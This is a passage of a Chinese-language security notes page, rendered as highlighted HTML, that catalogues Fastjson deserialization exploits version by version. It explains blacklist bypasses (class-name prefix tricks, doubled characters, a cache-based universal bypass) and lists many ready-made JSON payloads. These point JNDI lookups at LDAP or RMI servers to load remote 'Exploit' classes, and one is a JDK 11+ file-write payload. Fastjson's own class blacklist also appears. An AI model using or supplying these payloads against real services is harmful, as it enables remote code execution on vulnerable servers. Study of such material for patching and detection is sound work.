plain">当autoTypeSupport为False时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">当autoTypeSupport为True时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1.2.25黑名单</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">bsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">com.mchange</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">com.sun.</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">java.lang.Thread</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">java.net.Socket</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">java.rmi</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">javax.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.apache.bcel</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.apache.commons.beanutils</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.apache.commons.collections.Transformer</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.apache.commons.collections.functors</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.apache.commons.collections4.comparators</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.apache.commons.fileupload</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.apache.myfaces.context.servlet</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.apache.tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.apache.wicket.util</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.codehaus.groovy.runtime</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.hibernate</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.jboss</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.mozilla.javascript</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.python.core</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">org.springframework</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">条件需要开启autotype</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">类名前面加了一个L，后面加一个;可以绕过黑名单</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;, &quot;autoCommit&quot;:true}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> Fastjson 1.2.25-1.2.42</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">从1.2.42版本开始,把之前的明文黑名单，改为hash黑名单。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">如下大佬整理的</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">https://github.com/LeadroyaL/fastjson-blacklist</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">条件需要开启autotype</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">双写绕过</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;, &quot;autoCommit&quot;:true}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> Fastjson 1.2.25-1.2.43</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">条件需要开启autotype</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">加[{绕过</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[{,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;, &quot;autoCommit&quot;:true}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> Fastjson 1.2.25-1.2.45</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">条件需要开启autotype</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">45把之前问题修了，但是可以借助第三方组件绕过。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">需要mybatis，且版本需为3.x.x系列&lt;3.5.0的版本。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:{&quot;data_source&quot;:&quot;ldap://localhost:1389/badNameClass&quot;}}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> Fastjson1.2.25-1.2.47通杀</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">借助缓存进行通杀，缓存在1.2.48被改为默认关闭</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">漏洞原理是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">这里有两大版本范围：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">poc:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;a&quot;:{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;b&quot;:{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;autoCommit&quot;:true</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">1.2.48之后版本，小弟水平有限还未复现研究，payload需要注意的细节还未探索</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> Fastjson1.2.5 &lt;= 1.2.59</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">需要开启AutoType</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> Fastjson1.2.5 &lt;= 1.2.60</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">无需开启 autoType：</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">shell</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-shell">{&quot;@type&quot;:&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&quot;xaDataSourceName&quot;:&quot;rmi://10.10.20.166:1099/ExportObject&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-shell" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-shell">{&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://10.10.20.166:1389/ExportObject&quot;}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> Fastjson1.2.5 &lt;= 1.2.61</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;Object&quot;:&quot;a&quot;}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> Fastjson &lt;1.2.62</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> 需要开启AutoType；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Fastjson &lt;= 1.2.62；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> JNDI注入利用所受的JDK版本限制；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> 目标服务端需要存在xbean-reflect包；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: {&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://localhost:1389/Exploit&quot;}, &quot;namespace&quot;:&quot;&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java"></span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> fastjson&lt;=1.2.66</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> 前提条件</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> 开启AutoType；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Fastjson &lt;= 1.2.66；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> JNDI注入利用所受的JDK版本限制；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;Realms&quot;:[&quot;&quot;]}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: {&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://192.168.80.1:1399/Calc&quot;}}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">适用于jdk11以上版本的写文件的payload：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;out&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;out&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">           &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">           &quot;file&quot;: &quot;/tmp/asdasd&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">           &quot;append&quot;: true</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;infl&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">           &quot;input&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">               &quot;array&quot;: &quot;eJxLLE5JTCkGAAh5AnE=&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">               &quot;limit&quot;: 14</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">           }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;bufLen&quot;: &quot;100&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;protocolVersion&quot;: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> fastjson&lt;=1.2.67</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> 前提条件</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> 开启AutoType；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Fastjson &lt;= 1.2.67；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> JNDI注入利用所受的JDK版本限制；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</span><br></span><span class="token-line" 